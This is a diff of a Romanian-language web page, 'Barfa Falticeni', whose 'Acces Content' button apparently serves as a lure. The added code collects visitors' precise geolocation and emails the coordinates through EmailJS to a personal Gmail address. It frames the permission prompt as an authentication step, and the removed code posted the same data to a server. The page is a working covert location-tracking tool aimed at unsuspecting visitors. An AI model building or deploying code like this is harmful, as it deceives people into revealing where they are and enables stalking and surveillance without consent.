@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Barfa Falticeni</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -39,42 +40,38 @@
     <button onclick="sendLocation()">Acces Content</button>
     
     <script>
-        function sendLocation() {
-            if (!navigator.geolocation) {
-                alert('Din păcate, browserul tău nu suportă geolocalizare.');
-                return;
-            }
+        emailjs.init("bIL849otAkTIk8w1o"); // Public Key
 
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
+                    
+                    const emailParams = {
+                        to_email: "ciprianionut.exe17@gmail.com",
+                        subject: "Locație utilizator",
+                        message: `Latitudine: ${latitude}, Longitudine: ${longitude}, Precizie: ${accuracy}m`
+                    };
 
-                    console.log(`Lat: ${latitude}, Lon: ${longitude}, Precizie: ${accuracy}m`);
-
-                    fetch('https://barfafalticeni-server.com/send-location', { // Modifică URL-ul serverului aici
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ latitude, longitude, accuracy })
-                    })
-                    .then(response => response.json())
-                    .then(data => alert(`Autentificare realizată cu succes!`))
-                    .catch(error => console.error('Eroare:', error));
-                },
-                (error) => {
-                    if (error.code === error.PERMISSION_DENIED) {
-                        alert('Te rog să permiți accesul la locație pentru a continua.');
-                    } else {
-                        alert('Nu s-a putut obține locația. Încearcă din nou.');
-                    }
-                },
-                {
+                    emailjs.send("service_ar3ptv9", "template_er5zc5m", emailParams)
+                        .then(response => {
+                            alert("Locația a fost trimisă cu succes!");
+                        }, error => {
+                            console.error("Eroare la trimiterea emailului:", error);
+                            alert("Eroare la trimiterea locației.");
+                        });
+                }, error => {
+                    alert("Nu te poti autentifica. Verifică permisiunile browserului.");
+                }, {
                     enableHighAccuracy: true,
-                    timeout: 15000, // Timeout mai mare pentru iOS
+                    timeout: 10000,
                     maximumAge: 0
-                }
-            );
+                });
+            } else {
+                alert("Browserul tău nu suportă geolocalizare.");
+            }
         }
     </script>
 </body>
